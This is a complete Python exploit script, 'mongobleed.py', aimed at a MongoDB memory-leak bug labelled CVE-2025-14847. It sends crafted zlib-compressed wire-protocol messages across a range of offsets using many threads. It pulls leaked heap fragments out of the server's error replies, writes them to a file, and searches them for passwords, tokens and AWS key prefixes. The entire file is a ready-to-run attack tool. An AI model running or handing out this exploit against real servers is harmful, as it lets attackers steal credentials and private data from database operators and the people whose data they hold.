#!/usr/bin/env python3
"""
mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit

Original Author: Joe Desimone - x.com/dez_
Modified by: SirBugs (Fares Walid) - Added multithreading & enhanced features

Exploits zlib decompression bug to leak server memory via BSON field names.
"""

import socket
import struct
import zlib
import re
import argparse
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

def send_probe(host, port, doc_len, buffer_size):
    content = b'\x10a\x00\x01\x00\x00\x00'
    bson = struct.pack('<i', doc_len) + content
    
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    compressed = zlib.compress(op_msg)
    
    payload = struct.pack('<I', 2013)
    payload += struct.pack('<i', buffer_size)
    payload += struct.pack('B', 2)
    payload += compressed
    
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    sock = None
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((host, port))
        sock.sendall(header + payload)
        
        response = b''
        start_time = time.time()
        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
            if time.time() - start_time > 3:
                break
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        return response
    except:
        return b''
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass

def extract_leaks(response):
    if len(response) < 25:
        return []
    
    try:
        msg_len = struct.unpack('<I', response[:4])[0]
        if struct.unpack('<I', response[12:16])[0] == 2012:
            raw = zlib.decompress(response[25:msg_len])
        else:
            raw = response[16:msg_len]
    except:
        return []
    
    leaks = []
    
    for match in re.finditer(rb"field name '([^']*)'", raw):
        data = match.group(1)
        if data and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
    
    for match in re.finditer(rb"type (\d+)", raw):
        leaks.append(bytes([int(match.group(1)) & 0xFF]))
    
    return leaks

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-14847 MongoDB Memory Leak')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
    parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
    parser.add_argument('--output', default='leaked.bin', help='Output file')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Number of threads')
    args = parser.parse_args()
    
    print(f"[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
    print(f"[*] Original Author: Joe Desimone - x.com/dez_")
    print(f"[*] Modified by: SirBugs (Fares Walid)")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset}")
    print(f"[*] Using {args.threads} threads")
    print()
    
    all_leaked = bytearray()
    unique_leaks = set()
    total_scans = args.max_offset - args.min_offset
    progress_lock = threading.Lock()
    completed = [0]
    
    print(f"[*] Testing connection to {args.host}:{args.port}...")
    test_response = send_probe(args.host, args.port, 20, 520)
    if not test_response:
        print(f"\n[!] Failed to connect or no response from server.")
        return
    print(f"OK (received {len(test_response)} bytes)")
    print()
    
    def probe_worker(doc_len):
        response = send_probe(args.host, args.port, doc_len, doc_len + 500)
        leaks = extract_leaks(response)
        return doc_len, leaks
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(probe_worker, doc_len): doc_len 
                   for doc_len in range(args.min_offset, args.max_offset)}
        
        for future in as_completed(futures):
            doc_len, leaks = future.result()
            
            with progress_lock:
                completed[0] += 1
                
                for data in leaks:
                    if data not in unique_leaks:
                        unique_leaks.add(data)
                        all_leaked.extend(data)
                        
                        if len(data) > 10:
                            sys.stdout.write('\r' + ' ' * 100 + '\r')
                            preview = data[:80].decode('utf-8', errors='replace')
                            print(f"[+] offset={doc_len:4d} len={len(data):4d}: {preview}")
                
                progress = (completed[0] / total_scans) * 100
                sys.stdout.write(f"\r[*] Progress: {progress:.1f}% ({completed[0]}/{total_scans}) - Leaks: {len(unique_leaks)} ({len(all_leaked)} bytes)  ")
                sys.stdout.flush()
    
    sys.stdout.write('\n')
    
    with open(args.output, 'wb') as f:
        f.write(all_leaked)
    
    print()
    print(f"[*] Total leaked: {len(all_leaked)} bytes")
    print(f"[*] Unique fragments: {len(unique_leaks)}")
    print(f"[*] Saved to: {args.output}")
    
    secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
    for s in secrets:
        if s.lower() in all_leaked.lower():
            print(f"[!] Found pattern: {s.decode()}")

if __name__ == '__main__':
    main()
